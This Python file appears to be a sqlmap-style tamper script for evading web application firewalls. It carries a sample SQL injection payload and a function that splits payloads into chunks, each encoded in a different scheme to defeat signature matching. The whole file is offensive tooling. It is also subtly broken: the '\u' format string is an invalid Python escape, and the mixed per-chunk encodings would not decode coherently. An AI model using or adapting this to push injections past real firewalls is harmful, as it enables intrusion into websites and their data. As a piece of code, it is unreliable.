import random
import urllib.parse

__example_payload__ = "' UNION SELECT NULL--"
__type__ = "encoding chain fragmentation: applies layered encodings to break WAF pattern matching"


def tamper(payload, **kwargs):
    if not payload:
        return payload

    # Apply random encoding layers to different parts of the payload
    n = random.randint(2, 4)
    chunk_size = max(2, len(payload) // n)
    chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]

    encoders = [
        lambda s: ''.join('%{:02x}'.format(ord(c)) for c in s),
        lambda s: urllib.parse.quote(s),
        lambda s: ''.join('&#{};'.format(ord(c)) for c in s),
        lambda s: ''.join('\u{:04x}'.format(ord(c)) for c in s),
    ]

    retval = ""
    for i, chunk in enumerate(chunks):
        encoder = encoders[i % len(encoders)]
        retval += encoder(chunk)

    return retval
